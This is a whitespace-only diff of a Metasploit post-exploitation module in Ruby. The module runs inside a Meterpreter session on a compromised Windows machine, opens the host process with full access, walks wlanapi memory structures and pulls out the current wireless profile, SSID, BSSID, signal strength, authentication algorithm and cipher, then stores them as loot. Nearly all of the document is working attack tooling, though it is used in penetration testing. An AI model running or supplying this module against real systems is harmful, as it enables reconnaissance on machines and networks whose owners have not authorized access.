@@ -14,40 +14,34 @@ require 'rex'
 
 
 class Metasploit3 < Msf::Post
-	
 	include Msf::Auxiliary::Report
 
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Gather Wireless Current Connection Info',
-				'Description'   => %q{
-					This module gathers information about the current connection on each
-					wireless lan interface on the target machine.
-				},
-				'License'       => MSF_LICENSE,
-				'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter' ]
-			))
+			'Name'          => 'Windows Gather Wireless Current Connection Info',
+			'Description'   => %q{
+				This module gathers information about the current connection on each
+				wireless lan interface on the target machine.
+			},
+			'License'       => MSF_LICENSE,
+			'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
+			'Version'       => '$Revision$',
+			'Platform'      => [ 'windows' ],
+			'SessionTypes'  => [ 'meterpreter' ]
+		))
 	end
 
 	def run
-	
 		#Opens memory access into the host process
 		mypid = client.sys.process.getpid
 		@host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
 		@wlanapi = client.railgun.wlanapi
-		
+
 		wlan_connections= "Wireless LAN Active Connections: \n"
-				
-		
 		wlan_handle = open_handle()
-		
 		wlan_iflist = enum_interfaces(wlan_handle)
-		
-	
+
 		wlan_iflist.each do |interface|
 			connect_info = query_current_connection(wlan_handle, interface['guid'])
 			guid = guid_to_string(interface['guid'])
@@ -68,9 +62,7 @@ class Metasploit3 < Msf::Post
 		end
 
 		wlan_connections.gsub!(/\x00/,"")
-				
 		store_loot("host.windows.wlan.connections", "text/plain", session, wlan_connections, "wlan_connections.txt", "Wireless LAN Connections")
-		
 		#close the Wlan API Handle
 		closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
 		if closehandle['return'] == 0
@@ -83,7 +75,6 @@ class Metasploit3 < Msf::Post
 
 
 	def open_handle 
-	
 		begin
 			wlhandle = @wlanapi.WlanOpenHandle(2,nil,4,4)
 		rescue
@@ -91,14 +82,11 @@ class Metasploit3 < Msf::Post
 			return nil
 		end
 		return wlhandle['phClientHandle']
-	
 	end
 
 	def query_current_connection(wlan_handle, guid)
-		
 		connection={}
 		conn_info = @wlanapi.WlanQueryInterface(wlan_handle,guid,7,nil,4,4,nil)
-		
 		#Grab the pointer to our data structure. We skip voer the Interface State since we already have it
 		#We interpret the connection mode used first
 		pointer = conn_info['ppData']
@@ -121,12 +109,12 @@ class Metasploit3 < Msf::Post
 			else
 				connection['state'] = "Unknown connection Mode."
 		end
-		
+
 		#Grab the wirelessprofile name used in the connection
 		pointer = (pointer+4)
 		profile = @host_process.memory.read(pointer,512)
 		connection['profile'] = profile.gsub(/\x00/,"")
-		
+
 		#Check the size of the SSID value. If we get nothing back, the interface is not currently connected
 		#We return nil and deal with the results back in the calling function
 		pointer = (pointer+512)
@@ -134,12 +122,12 @@ class Metasploit3 < Msf::Post
 		unless len_ssid.unpack("V")[0] 
 			return nil
 		end
-		
+
 		#Grabs the SSID of the BSS connected to
 		pointer = (pointer + 4)
 		ssid = @host_process.memory.read(pointer,32)
 		connection['ssid'] = ssid.gsub(/\x00/,"")
-		
+
 		#Grabs what type of a BSS this is and itnerpretes it into human readable
 		pointer = (pointer + 32)
 		bsstype = @host_process.memory.read(pointer,4)
@@ -154,7 +142,7 @@ class Metasploit3 < Msf::Post
 			else
 				connection['type'] = "Unknown BSS Type"
 		end
-		
+
 		#Grabs the BSS MAC address
 		pointer = (pointer + 4)
 		bssid = @host_process.memory.read(pointer,6)
@@ -165,7 +153,7 @@ class Metasploit3 < Msf::Post
 		bssid.insert(11,":")
 		bssid.insert(14,":")
 		connection['bssid'] = bssid
-		
+
 		#Grabs the physical association type and interprets it into human readable
 		pointer = (pointer + 8)
 		phy_type = @host_process.memory.read(pointer,4)
@@ -188,22 +176,22 @@ class Metasploit3 < Msf::Post
 			else
 				connection['physical'] = "Unknown Association Type"
 		end
-		
+
 		#Grabs the signal strength value
 		pointer = (pointer + 8)
 		signal = @host_process.memory.read(pointer,4)
 		connection['signal'] = signal.unpack("V")[0]
-		
+
 		#Grabs the recieve rate value
 		pointer = (pointer + 4)
 		rxrate = @host_process.memory.read(pointer,4)
 		connection['rxrate'] = rxrate.unpack("V")[0]
-		
+
 		#Grabs the transmit rate value
 		pointer = (pointer + 4)
 		txrate = @host_process.memory.read(pointer,4)
 		connection['txrate'] = txrate.unpack("V")[0]
-		
+
 		#Checks if security is enabled on this BSS
 		pointer = (pointer + 4)
 		security_enabled = @host_process.memory.read(pointer,4)		
@@ -212,7 +200,7 @@ class Metasploit3 < Msf::Post
 		else
 			connection['security'] = "No"
 		end
-		
+
 		#Checks of 802.1x Authentication is used
 		pointer = (pointer + 4)
 		onex = @host_process.memory.read(pointer,4)
@@ -221,7 +209,7 @@ class Metasploit3 < Msf::Post
 		else
 			connection['oneX'] = "No"
 		end
-		
+
 		#Determines wat Authentication Algorithm is being used
 		pointer = (pointer + 4)
 		algo = @host_process.memory.read(pointer,4)
@@ -244,7 +232,7 @@ class Metasploit3 < Msf::Post
 			else
 				connection['auth'] = "Unknown Algorithm"
 		end
-		
+
 		#Determines what Cipher is being used
 		pointer = (pointer + 4)
 		cipher = @host_process.memory.read(pointer,4)
@@ -267,28 +255,23 @@ class Metasploit3 < Msf::Post
 			else
 				connection['cipher'] = "Unknown Cipher"
 		end
-		
-		return connection	
-					
+		return connection
 	end
 
 
 	def enum_interfaces(wlan_handle)
-	
-			
 		iflist = @wlanapi.WlanEnumInterfaces(wlan_handle,nil,4)
 		pointer= iflist['ppInterfaceList']
-		
+
 		numifs = @host_process.memory.read(pointer,4)
 		numifs = numifs.unpack("V")[0]
-		
-		
+
 		interfaces = []
-		
+
 		#Set the pointer ahead to the first element in the array
 		pointer = (pointer + 8)
 		(1..numifs).each do |i|
-		
+
 			interface = {}
 			#Read the GUID (16 bytes)
 			interface['guid'] = @host_process.memory.read(pointer,16)
@@ -299,7 +282,7 @@ class Metasploit3 < Msf::Post
 			#Read the state of the interface (4 bytes)
 			state = @host_process.memory.read(pointer,4)
 			pointer = (pointer + 4)
-			
+
 			#Turn the state into human readable form
 			state = state.unpack("V")[0]
 			case state
@@ -324,22 +307,16 @@ class Metasploit3 < Msf::Post
 			end
 			interfaces << interface
 		end
-	
 		return interfaces
-	
 	end
 
-	
 	#Convert the GUID to human readable form
 	def guid_to_string(guid)
-	
 		aguid = guid.unpack("H*")[0]
-		
 		sguid = "{" + aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2] 
 		sguid << "-" + aguid[10,2] +  aguid[8,2] + "-" + aguid[14,2] + aguid[12,2] + "-" +  aguid[16,4]
 		sguid << "-" + aguid[20,12] + "}"
 		return sguid
-
 	end
 
 end
